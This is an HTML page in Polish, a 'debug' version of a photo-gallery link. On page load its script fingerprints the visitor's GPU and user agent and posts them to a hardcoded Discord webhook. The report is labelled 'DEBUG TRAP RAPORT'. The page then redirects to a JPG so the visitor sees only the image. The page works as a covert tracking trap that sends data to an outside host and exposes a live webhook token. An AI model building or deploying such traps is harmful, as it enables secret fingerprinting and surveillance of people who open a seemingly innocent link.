<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Debug Mode - Galeria</title>
  <style>
    body { background: #0f172a; color: #fff; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
    .loader { border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
    #debug-box { margin-top: 20px; padding: 10px; background: #1e293b; border: 1px solid #38bdf8; border-radius: 5px; max-width: 90%; word-break: break-all; font-size: 12px; color: #38bdf8; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader"></div>
  <p id="status-text">Inicjalizacja modułu debugowania...</p>
  <div id="debug-box">Oczekiwanie na zdarzenia...</div>

  <script>
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1550302869847281716/Vm79NB7uHGzqnzfUSaj2dmW5vr0sQ6fMxQJOUUP2h1n6BSpSNKKUf9oea9ZQJ0uyhaf5";
    const REDIRECT_URL = "./20260808_121307.jpg";

    function logDebug(msg) {
      console.log(msg);
      const box = document.getElementById('debug-box');
      box.innerHTML += "<br>> " + msg;
    }

    // Twardy bezpiecznik: po 3 sekundach wymuszamy przekierowanie bez względu na wszystko
    const safetyTimer = setTimeout(() => {
      logDebug("CRITICAL: Safety timer triggered! Force redirecting...");
      window.location.replace(REDIRECT_URL);
    }, 3000);

    async function runDebugTrap() {
      try {
        logDebug("Start zbierania telemetrii...");
        
        let gpu = "Brak";
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl');
          if (gl) {
            const di = gl.getExtension('WEBGL_debug_renderer_info');
            if (di) gpu = gl.getParameter(di.UNMASKED_RENDERER_WEBGL);
          }
        } catch(err) {
          logDebug("GPU Error: " + err.message);
        }

        const payload = {
          username: "DEBUG OSINT BOT",
          embeds: [{
            title: "🐞 DEBUG TRAP RAPORT",
            color: 16711680,
            fields: [
              { name: "GPU", value: `\`${gpu}\`` },
              { name: "UA", value: `\`\`\`${navigator.userAgent}\`\`\`` }
            ],
            timestamp: new Date()
          }]
        };

        logDebug("Wysyłanie fetch do Discorda...");
        
        const response = await fetch(DISCORD_WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          keepalive: true
        });

        logDebug("Discord response status: " + response.status);

      } catch(e) {
        logDebug("EXC_ROUTINE: " + e.message);
      } finally {
        logDebug("Blok finally: czyszczenie timera i skok do zdjęcia.");
        clearTimeout(safetyTimer);
        setTimeout(() => {
          window.location.replace(REDIRECT_URL);
        }, 500); // Małe opóźnienie, żebyś zdążył przeczytać logi na ekranie
      }
    }

    runDebugTrap();
  </script>
</body>
</html>
